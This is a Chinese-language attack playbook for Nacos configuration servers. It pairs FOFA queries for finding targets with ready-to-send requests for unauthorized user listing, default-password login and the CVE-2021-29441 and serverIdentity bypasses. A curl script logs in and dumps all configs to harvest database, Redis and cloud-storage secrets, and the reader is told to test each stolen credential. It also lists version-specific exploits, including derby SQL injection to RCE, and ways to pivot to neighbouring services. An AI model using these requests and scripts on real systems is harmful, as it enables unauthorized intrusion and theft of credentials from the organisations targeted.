# Nacos 专杀卡 — 命中即按此打

**触发**: FOFA `app="NACOS"` / 8848 端口 / `X-Application-Context` + Nacos 特征

## S1 秒杀接口（命中一个即确认，逐个打）
```
# ① 未授权读用户(最高信号: 返回JSON用户列表=未授权)
GET /nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate

# ② 默认口令(2.x: nacos/nacos, 老版本: nacos/123456)
POST /nacos/v1/auth/login  body: username=nacos&password=nacos
→ {"globalAdmin":true} = admin 确认

# ③ CVE-2021-29441 认证绕过(2.2.1前全版本, 免凭据读任何需鉴权接口)
GET /nacos/v1/auth/users?pageNo=1&pageSize=5&search=accurate
Host: <ip>:8848
User-Agent: Nacos-Server

# ④ serverIdentity 默认key 绕过(<=2.2.0)
GET /nacos/v1/auth/users?pageNo=1&pageSize=5&search=accurate
serverIdentity: security
```
**信号判定**: ①/③ 返回 `{"totalCount":N,"pageItems":[...]}` = 未授权访问确认；② 返回 `accessToken`+`globalAdmin:true` = admin 确认。

## 确认后 → 配置中心读凭据（核心利用, 全量拉配置找敏感信息）
```bash
TOKEN=$(curl -s -X POST "http://<ip>:8848/nacos/v1/auth/login" -d "username=nacos&password=nacos" | jq -r .accessToken)
# 全量配置列表 → 提取 jdbc/redis/secret/key/password/minio
curl -s "http://<ip>:8848/nacos/v1/cs/configs?pageNo=1&pageSize=100&search=blur&dataId=&group=&tenant=&accessToken=$TOKEN"
```
**要找的**: `jdbc:mysql` 连接串 + `username/password` / `redis.host:port` / `minio_url` / `oss.secretKey` / 内网 IP
→ **每条凭据都要实测**（Redis 直连 AUTH、MySQL 内网可达性、MinIO 匿名读桶）

## 版本判断
```
GET /nacos/v1/console/server/state  → {"version":"2.x.x",...}
Last-Modified / 控制台 JS 特征也能判
```

## 版本 → 利用链
| 版本 | 可打 |
|------|------|
| ≤1.4.x | derby SQL 注入: `GET /nacos/v1/cs/admin/derby?sql=<SQL>` → 写文件 RCE（需 admin） |
| 2.2.1 前 | CVE-2021-29441 UA 绕过 + serverIdentity 默认key |
| 2.2.3 前 | CVE-2023-1272 权限绕过（1.4.0-2.2.0, 改密码/加用户） |
| 任意 | 未授权读用户 + 默认口令 + 配置中心凭据泄露 |

## 同 IP 穷尽（Nacos 常见旁站）
```
# 同 IP 常挂: Redis(6379, 配置泄露密码直连AUTH) / Nginx反代网关(80/8080/9361)
# → ThingsBoard(8080 默认 sysadmin@thingsboard.org/sysadmin) / SpringBoot Actuator / JeecgBoot
# 每个端口都跑: 默认口令 + 未授权接口
```
**Redis 验证**: `python -c "import socket;s=socket.socket();s.settimeout(3);s.connect(('IP',6379));s.send(b'PING\r\n');print(s.recv(50))"` → `-NOAUTH` = 需认证(用泄露密码 AUTH) / `+PONG` = 未授权直接可用

## 止损
- 未授权/默认口令/CVE 三者全无回显 → 2min 止损，换目标
- 不写 Redis(crontab/SSHkey 破坏性)、不改密码、不删配置 → 只读验证
